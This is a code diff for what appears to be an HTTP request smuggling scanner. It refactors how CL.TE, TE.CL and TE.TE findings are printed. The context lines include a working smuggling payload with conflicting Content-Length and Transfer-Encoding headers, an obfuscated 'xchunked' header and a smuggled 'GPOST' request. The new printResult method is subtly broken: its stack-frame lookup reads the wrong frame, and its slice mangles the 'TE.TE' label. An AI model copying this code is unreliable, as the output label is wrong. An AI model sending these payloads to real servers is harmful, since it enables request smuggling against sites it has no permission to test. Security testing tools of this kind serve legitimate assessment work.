@@ -55,10 +55,7 @@ class checkServer:
         sendPayload(url, header, data)
         
         if time.time() - start >= self.timeout:
-            print(f'{bcolors.WARNING}[*] Server using CL.TE{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}====== payload ======")
-            print(header + data, end="")
-            print(f"======================{bcolors.ENDC}")
+            self.printResult(header, data)
             return 1
         return 0
         
@@ -74,23 +71,18 @@ class checkServer:
         sendPayload(url, header, data)
         
         if time.time() - start >= self.timeout:
-            print(f'{bcolors.WARNING}[*] Server using TE.CL{bcolors.ENDC}')
-            print(f"{bcolors.FAIL}====== payload ======")
-            print(header + data, end="")
-            print(f"======================{bcolors.ENDC}")
+            self.printResult(header, data)
             return 1
         return 0
         
     # Check server is TE.TE    
     def checkTETE(self, url, req):
         for i in range(self.loop):
-            
             print("[*] Testing TE.TE...")
             
             header = 'POST / HTTP/1.1\r\nHost: {}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n'.format(urlparse(url).netloc)
             data = '5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nx=1\r\n0\r\n\r\n'
             
-            start = time.time()
             sendPayload(url, header, data)
             
             # Send one normal request to test TETE.
@@ -99,13 +91,16 @@ class checkServer:
             
             # Check if request is smuggled. 
             if res.text.find("GPOST") != -1:
-                print(f'{bcolors.WARNING}[*] Server using TE.TE{bcolors.ENDC}')
-                print(f"{bcolors.FAIL}====== payload ======")
-                print(header + data, end="")
-                print(f"======================{bcolors.ENDC}")
+                self.printResult(header, data)
                 return 1
         
         return 0
+        
+    def printResult(self, header, data):
+        print(f'{bcolors.WARNING}[*] Server using {sys._getframe(2).f_code.co_name.replace("check", "")[:4]}{bcolors.ENDC}')
+        print(f"{bcolors.FAIL}====== payload ======")
+        print(header + data, end="")
+        print(f"======================{bcolors.ENDC}")
 
 def banner():
 	print("""
